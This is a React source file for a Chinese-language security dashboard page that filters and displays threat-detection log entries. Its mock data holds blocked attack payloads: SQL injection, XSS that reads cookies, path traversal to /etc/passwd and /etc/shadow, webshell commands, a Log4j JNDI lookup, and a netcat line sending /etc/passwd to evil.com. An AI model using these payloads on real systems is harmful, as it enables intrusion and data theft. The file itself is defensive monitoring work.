import { useState } from 'react'
import { Shield, Search, Filter, ChevronDown, ChevronUp, ChevronLeft, ChevronRight } from 'lucide-react'

const THREAT_TYPES = ['SQL注入', 'XSS攻击', 'RCE', 'WebShell', '扫描探测', '漏洞利用', '路径穿越', '暴力破解']
const LEVELS = ['全部', '低', '中', '高', '严重']

interface ThreatEntry {
  id: number
  time: string
  ip: string
  method: string
  path: string
  statusCode: number
  type: string
  level: string
  rule: string
  raw: string
  matched: string
}

const mockThreats: ThreatEntry[] = [
  { id: 1, time: '2026-03-28 14:12:45', ip: '185.220.101.34', method: 'GET', path: '/api/v1/users?id=1%20OR%201=1', statusCode: 403, type: 'SQL注入', level: 'critical', rule: 'SQL_OR_1=1', raw: '185.220.101.34 - - [28/Mar/2026:14:12:45 +0800] "GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1" 403 89', matched: 'id=1 OR 1=1' },
  { id: 2, time: '2026-03-28 14:12:32', ip: '45.134.26.97', method: 'GET', path: '/search?q=<script>alert(1)</script>', statusCode: 403, type: 'XSS攻击', level: 'high', rule: 'XSS_SCRIPT', raw: '45.134.26.97 - - [28/Mar/2026:14:12:32 +0800] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 403 102', matched: '<script>alert(1)</script>' },
  { id: 3, time: '2026-03-28 14:12:18', ip: '103.75.201.18', method: 'POST', path: '/cgi-bin/test.cgi;ls', statusCode: 403, type: 'RCE', level: 'critical', rule: 'RCE_CMD_EXEC', raw: '103.75.201.18 - - [28/Mar/2026:14:12:18 +0800] "POST /cgi-bin/test.cgi;ls HTTP/1.1" 403 67', matched: ';ls' },
  { id: 4, time: '2026-03-28 14:11:56', ip: '91.240.118.172', method: 'GET', path: '/files/../../../etc/passwd', statusCode: 403, type: '路径穿越', level: 'medium', rule: 'PATH_TRAVERSAL', raw: '91.240.118.172 - - [28/Mar/2026:14:11:56 +0800] "GET /files/../../../etc/passwd HTTP/1.1" 403 89', matched: '../../../etc/passwd' },
  { id: 5, time: '2026-03-28 14:11:34', ip: '194.163.137.89', method: 'GET', path: '/wp-admin/', statusCode: 301, type: '扫描探测', level: 'medium', rule: 'SCAN_WPADMIN', raw: '194.163.137.89 - - [28/Mar/2026:14:11:34 +0800] "GET /wp-admin/ HTTP/1.1" 301 0', matched: '/wp-admin/' },
  { id: 6, time: '2026-03-28 14:11:12', ip: '5.188.86.17', method: 'POST', path: '/login', statusCode: 401, type: 'SQL注入', level: 'high', rule: 'SQL_COMMENT_BYPASS', raw: '5.188.86.17 - - [28/Mar/2026:14:11:12 +0800] "POST /login HTTP/1.1" 401 67 "user=admin\'--"', matched: "admin'--" },
  { id: 7, time: '2026-03-28 14:10:58', ip: '162.247.74.202', method: 'GET', path: '/uploads/img.php', statusCode: 403, type: 'WebShell', level: 'critical', rule: 'WEBSHELL_PHP', raw: '162.247.74.202 - - [28/Mar/2026:14:10:58 +0800] "GET /uploads/img.php?cmd=whoami HTTP/1.1" 403 89', matched: 'img.php?cmd=whoami' },
  { id: 8, time: '2026-03-28 14:10:45', ip: '212.21.66.6', method: 'POST', path: '/api/auth/login', statusCode: 401, type: '暴力破解', level: 'low', rule: 'BRUTE_FORCE', raw: '212.21.66.6 - - [28/Mar/2026:14:10:45 +0800] "POST /api/auth/login HTTP/1.1" 401 45 (15th failure)', matched: '连续15次登录失败' },
  { id: 9, time: '2026-03-28 14:10:23', ip: '171.25.193.77', method: 'GET', path: '/solr/admin/cores', statusCode: 403, type: '漏洞利用', level: 'high', rule: 'VULN_SOLR', raw: '171.25.193.77 - - [28/Mar/2026:14:10:23 +0800] "GET /solr/admin/cores HTTP/1.1" 403 89', matched: '/solr/admin/cores' },
  { id: 10, time: '2026-03-28 14:10:01', ip: '103.152.220.23', method: 'GET', path: '/.env', statusCode: 404, type: '扫描探测', level: 'low', rule: 'SCAN_ENV', raw: '103.152.220.23 - - [28/Mar/2026:14:10:01 +0800] "GET /.env HTTP/1.1" 404 0', matched: '/.env' },
  { id: 11, time: '2026-03-28 14:09:45', ip: '185.220.101.34', method: 'POST', path: '/api/v1/users', statusCode: 403, type: 'SQL注入', level: 'critical', rule: 'SQL_UNION', raw: '185.220.101.34 - - [28/Mar/2026:14:09:45 +0800] "POST /api/v1/users HTTP/1.1" 403 89 "1 UNION SELECT * FROM users--"', matched: 'UNION SELECT' },
  { id: 12, time: '2026-03-28 14:09:30', ip: '45.134.26.97', method: 'GET', path: '/page?id=1"><img src=x onerror=alert(1)>', statusCode: 403, type: 'XSS攻击', level: 'high', rule: 'XSS_EVENT', raw: '45.134.26.97 - - [28/Mar/2026:14:09:30 +0800] "GET /page?id=1\"><img src=x onerror=alert(1)> HTTP/1.1" 403 89', matched: 'onerror=alert(1)' },
  { id: 13, time: '2026-03-28 14:09:15', ip: '103.75.201.18', method: 'GET', path: '/shell.php?cmd=cat+/etc/passwd', statusCode: 403, type: 'RCE', level: 'critical', rule: 'RCE_WEB_SHELL', raw: '103.75.201.18 - - [28/Mar/2026:14:09:15 +0800] "GET /shell.php?cmd=cat+/etc/passwd HTTP/1.1" 403 89', matched: 'cmd=cat+/etc/passwd' },
  { id: 14, time: '2026-03-28 14:09:00', ip: '91.240.118.172', method: 'GET', path: '/admin/..%2F..%2Fetc%2Fshadow', statusCode: 403, type: '路径穿越', level: 'medium', rule: 'PATH_ENCODED', raw: '91.240.118.172 - - [28/Mar/2026:14:09:00 +0800] "GET /admin/..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 89', matched: '..%2F..%2Fetc%2Fshadow' },
  { id: 15, time: '2026-03-28 14:08:45', ip: '194.163.137.89', method: 'GET', path: '/phpmyadmin/', statusCode: 404, type: '扫描探测', level: 'low', rule: 'SCAN_PHPMYADMIN', raw: '194.163.137.89 - - [28/Mar/2026:14:08:45 +0800] "GET /phpmyadmin/ HTTP/1.1" 404 0', matched: '/phpmyadmin/' },
  { id: 16, time: '2026-03-28 14:08:30', ip: '5.188.86.17', method: 'GET', path: '/api/v2/items/${jndi:ldap://evil.com/a}', statusCode: 403, type: '漏洞利用', level: 'critical', rule: 'VULN_LOG4J', raw: '5.188.86.17 - - [28/Mar/2026:14:08:30 +0800] "GET /api/v2/items/${jndi:ldap://evil.com/a} HTTP/1.1" 403 89', matched: '${jndi:ldap://evil.com/a}' },
  { id: 17, time: '2026-03-28 14:08:15', ip: '162.247.74.202', method: 'POST', path: '/upload.php', statusCode: 403, type: 'WebShell', level: 'high', rule: 'WEBSHELL_UPLOAD', raw: '162.247.74.202 - - [28/Mar/2026:14:08:15 +0800] "POST /upload.php HTTP/1.1" 403 89 (shell.phtml)', matched: '上传文件: shell.phtml' },
  { id: 18, time: '2026-03-28 14:08:00', ip: '212.21.66.6', method: 'POST', path: '/api/auth/login', statusCode: 401, type: '暴力破解', level: 'low', rule: 'BRUTE_FORCE', raw: '212.21.66.6 - - [28/Mar/2026:14:08:00 +0800] "POST /api/auth/login HTTP/1.1" 401 45 (8th failure)', matched: '连续8次登录失败' },
  { id: 19, time: '2026-03-28 14:07:45', ip: '171.25.193.77', method: 'GET', path: '/actuator/env', statusCode: 403, type: '漏洞利用', level: 'high', rule: 'VULN_SPRING', raw: '171.25.193.77 - - [28/Mar/2026:14:07:45 +0800] "GET /actuator/env HTTP/1.1" 403 89', matched: '/actuator/env' },
  { id: 20, time: '2026-03-28 14:07:30', ip: '103.152.220.23', method: 'GET', path: '/wp-content/plugins/debug/log.txt', statusCode: 404, type: '扫描探测', level: 'low', rule: 'SCAN_SENSITIVE', raw: '103.152.220.23 - - [28/Mar/2026:14:07:30 +0800] "GET /wp-content/plugins/debug/log.txt HTTP/1.1" 404 0', matched: '/wp-content/plugins/debug/log.txt' },
  { id: 21, time: '2026-03-28 14:07:15', ip: '185.220.101.34', method: 'GET', path: '/api/users?id=1;DROP TABLE users;--', statusCode: 403, type: 'SQL注入', level: 'critical', rule: 'SQL_DROP', raw: '185.220.101.34 - - [28/Mar/2026:14:07:15 +0800] "GET /api/users?id=1;DROP TABLE users;-- HTTP/1.1" 403 89', matched: ';DROP TABLE users' },
  { id: 22, time: '2026-03-28 14:07:00', ip: '45.134.26.97', method: 'POST', path: '/comment', statusCode: 403, type: 'XSS攻击', level: 'medium', rule: 'XSS_SVG', raw: '45.134.26.97 - - [28/Mar/2026:14:07:00 +0800] "POST /comment HTTP/1.1" 403 102 "<svg onload=alert(document.cookie)>"', matched: '<svg onload=alert(document.cookie)>' },
  { id: 23, time: '2026-03-28 14:06:45', ip: '103.75.201.18', method: 'POST', path: '/api/exec', statusCode: 403, type: 'RCE', level: 'critical', rule: 'RCE_PIPE', raw: '103.75.201.18 - - [28/Mar/2026:14:06:45 +0800] "POST /api/exec HTTP/1.1" 403 67 "cmd=cat /etc/passwd | nc evil.com 4444"', matched: '| nc evil.com 4444' },
  { id: 24, time: '2026-03-28 14:06:30', ip: '91.240.118.172', method: 'GET', path: '/static/..././..././windows/win.ini', statusCode: 403, type: '路径穿越', level: 'high', rule: 'PATH_BYPASS', raw: '91.240.118.172 - - [28/Mar/2026:14:06:30 +0800] "GET /static/..././..././windows/win.ini HTTP/1.1" 403 89', matched: '..././..././windows/win.ini' },
  { id: 25, time: '2026-03-28 14:06:15', ip: '194.163.137.89', method: 'GET', path: '/.git/HEAD', statusCode: 404, type: '扫描探测', level: 'medium', rule: 'SCAN_GIT', raw: '194.163.137.89 - - [28/Mar/2026:14:06:15 +0800] "GET /.git/HEAD HTTP/1.1" 404 0', matched: '/.git/HEAD' },
]

const PAGE_SIZE = 10

export default function ThreatPage() {
  const [searchIp, setSearchIp] = useState('')
  const [selectedTypes, setSelectedTypes] = useState<string[]>([])
  const [selectedLevel, setSelectedLevel] = useState('全部')
  const [expandedId, setExpandedId] = useState<number | null>(null)
  const [page, setPage] = useState(1)

  const toggleType = (t: string) => {
    setSelectedTypes(prev => prev.includes(t) ? prev.filter(x => x !== t) : [...prev, t])
  }

  const filtered = mockThreats.filter(t => {
    if (searchIp && !t.ip.includes(searchIp)) return false
    if (selectedTypes.length > 0 && !selectedTypes.includes(t.type)) return false
    if (selectedLevel !== '全部') {
      const map: Record<string, string> = { '低': 'low', '中': 'medium', '高': 'high', '严重': 'critical' }
      if (t.level !== map[selectedLevel]) return false
    }
    return true
  })

  const totalPages = Math.ceil(filtered.length / PAGE_SIZE)
  const paged = filtered.slice((page - 1) * PAGE_SIZE, page * PAGE_SIZE)

  return (
    <div className="space-y-4 animate-slide-up">
      <div className="flex items-center justify-between">
        <h2 className="text-lg font-bold text-cyber-blue glow-blue flex items-center gap-2">
          <Shield size={20} /> 威胁检测
        </h2>
        <span className="text-xs text-gray-500">共 {filtered.length} 条威胁记录</span>
      </div>

      {/* Filters */}
      <div className="cyber-border rounded-lg p-4 space-y-3">
        <div className="flex items-center gap-2 text-xs text-gray-400">
          <Filter size={14} /> 筛选条件
        </div>

        {/* Type Filter */}
        <div className="flex flex-wrap gap-2">
          {THREAT_TYPES.map(t => (
            <button
              key={t}
              onClick={() => toggleType(t)}
              className={`px-2.5 py-1 rounded text-xs transition-all ${
                selectedTypes.includes(t)
                  ? 'bg-cyber-red/10 text-cyber-red border border-cyber-red/30'
                  : 'bg-dark-900/50 text-gray-500 border border-gray-700 hover:border-gray-500'
              }`}
            >
              {t}
            </button>
          ))}
        </div>

        {/* Level + IP */}
        <div className="flex flex-wrap gap-3">
          <div className="flex items-center gap-2">
            <span className="text-xs text-gray-500">级别：</span>
            {LEVELS.map(l => (
              <button
                key={l}
                onClick={() => { setSelectedLevel(l); setPage(1) }}
                className={`px-2 py-1 rounded text-xs transition-all ${
                  selectedLevel === l
                    ? 'bg-cyber-blue/10 text-cyber-blue border border-cyber-blue/30'
                    : 'text-gray-500 hover:text-gray-300'
                }`}
              >
                {l}
              </button>
            ))}
          </div>
          <div className="flex items-center gap-2 ml-auto">
            <Search size={14} className="text-gray-500" />
            <input
              value={searchIp}
              onChange={e => { setSearchIp(e.target.value); setPage(1) }}
              placeholder="搜索 IP 地址..."
              className="shield-input w-48"
            />
          </div>
        </div>
      </div>

      {/* Table */}
      <div className="cyber-border rounded-lg overflow-hidden">
        <div className="overflow-auto">
          <table className="w-full shield-table">
            <thead>
              <tr>
                <th>时间</th>
                <th>源 IP</th>
                <th>方法</th>
                <th>请求路径</th>
                <th>状态码</th>
                <th>威胁类型</th>
                <th>级别</th>
                <th>匹配规则</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              {paged.map(t => (
                <>
                  <tr
                    key={t.id}
                    onClick={() => setExpandedId(expandedId === t.id ? null : t.id)}
                    className="cursor-pointer"
                  >
                    <td className="font-mono text-xs text-gray-500 whitespace-nowrap">{t.time}</td>
                    <td className="font-mono text-xs text-cyber-blue">{t.ip}</td>
                    <td className="text-xs font-mono">{t.method}</td>
                    <td className="font-mono text-xs text-cyber-orange truncate max-w-[200px]">{t.path}</td>
                    <td className="font-mono text-xs">{t.statusCode}</td>
                    <td className="text-xs">{t.type}</td>
                    <td><span className={`badge-${t.level} px-2 py-0.5 rounded text-xs`}>{t.level}</span></td>
                    <td className="text-xs font-mono text-gray-400">{t.rule}</td>
                    <td>
                      {expandedId === t.id ? <ChevronUp size={14} className="text-gray-500" /> : <ChevronDown size={14} className="text-gray-500" />}
                    </td>
                  </tr>
                  {expandedId === t.id && (
                    <tr key={`${t.id}-detail`}>
                      <td colSpan={9} className="bg-dark-900/50 px-4 py-3">
                        <div className="space-y-2 text-xs">
                          <div>
                            <span className="text-gray-500">匹配内容：</span>
                            <code className="ml-2 px-2 py-0.5 bg-cyber-red/10 text-cyber-red rounded font-mono">{t.matched}</code>
                          </div>
                          <div>
                            <span className="text-gray-500">原始日志：</span>
                            <pre className="mt-1 p-2 bg-dark-900 rounded font-mono text-gray-400 whitespace-pre-wrap break-all">{t.raw}</pre>
                          </div>
                        </div>
                      </td>
                    </tr>
                  )}
                </>
              ))}
            </tbody>
          </table>
        </div>

        {/* Pagination */}
        <div className="flex items-center justify-between px-4 py-3 border-t border-gray-800">
          <span className="text-xs text-gray-500">
            第 {(page - 1) * PAGE_SIZE + 1}-{Math.min(page * PAGE_SIZE, filtered.length)} 条，共 {filtered.length} 条
          </span>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setPage(p => Math.max(1, p - 1))}
              disabled={page === 1}
              className="shield-btn p-1 disabled:opacity-30"
            >
              <ChevronLeft size={14} />
            </button>
            {Array.from({ length: totalPages }, (_, i) => (
              <button
                key={i}
                onClick={() => setPage(i + 1)}
                className={`w-7 h-7 rounded text-xs transition-all ${
                  page === i + 1
                    ? 'bg-cyber-blue/10 text-cyber-blue border border-cyber-blue/30'
                    : 'text-gray-500 hover:text-gray-300'
                }`}
              >
                {i + 1}
              </button>
            ))}
            <button
              onClick={() => setPage(p => Math.min(totalPages, p + 1))}
              disabled={page === totalPages}
              className="shield-btn p-1 disabled:opacity-30"
            >
              <ChevronRight size={14} />
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
